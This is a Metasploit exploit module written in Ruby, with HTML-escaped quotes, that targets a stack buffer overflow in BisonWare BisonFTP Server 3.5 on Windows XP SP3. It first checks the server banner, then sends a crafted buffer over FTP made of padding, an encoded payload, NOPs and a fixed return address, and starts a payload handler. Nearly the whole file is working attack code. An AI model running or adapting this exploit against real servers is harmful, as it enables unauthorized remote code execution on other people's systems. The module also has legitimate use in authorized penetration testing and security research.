# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit4 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;BisonWare BisonFTP Server Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
        BisonWare BisonFTP Server 3.5 is prone to an overflow condition.
        This module exploits a buffer overflow vulnerability in the said
        application.
      },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Author&#039;         =>
        [
          &#039;localh0t&#039;, # initial discovery
          &#039;veerendragg @ SecPod&#039;, # initial msf
          &#039;Jay Turla&#039; # msf
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;1999-1510&#039;],
          [ &#039;BID&#039;, &#039;49109&#039;],
          [ &#039;EDB&#039;, &#039;17649&#039;],
          [ &#039;URL&#039;, &#039;http://secpod.org/msf/bison_server_bof.rb&#039;]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DefaultOptions&#039; =>
        {
          &#039;VERBOSE&#039;  => true
        },
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;           => 310,
          &#039;BadChars&#039;        => "\x00\x0a\x0d",
          &#039;StackAdjustment&#039; => -3500,
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Bisonware FTP Server / Windows XP SP3 EN&#039;,
            {
              &#039;Ret&#039;    => 0x0040333f,
              &#039;Offset&#039; => 1028,
              &#039;Nops&#039;   =>  404
            }
          ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Aug 07 2011&#039;))
  end

  def check
    connect_login
    disconnect
    if /BisonWare BisonFTP server product V3\.5/i === banner
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    connect
    print_status(&#039;Triggering the prompt for an unregistered product&#039;)
    sock.put(&#039;&#039;)
    print_status(&#039;Disconnecting...&#039;)
    disconnect

    print_status(&#039;Connecting for the second time to deliver our payload...&#039;)
    connect #connect for the second time

    buf = rand_text_alpha(target[&#039;Offset&#039;])
    buf << payload.encoded
    buf << make_nops( (target[&#039;Nops&#039;]) - payload.encoded.length)
    buf << [target.ret].pack(&#039;V&#039;)
    print_status(&#039;Sending payload...&#039;)

    sock.put(buf)
    handler
    disconnect
  end
end

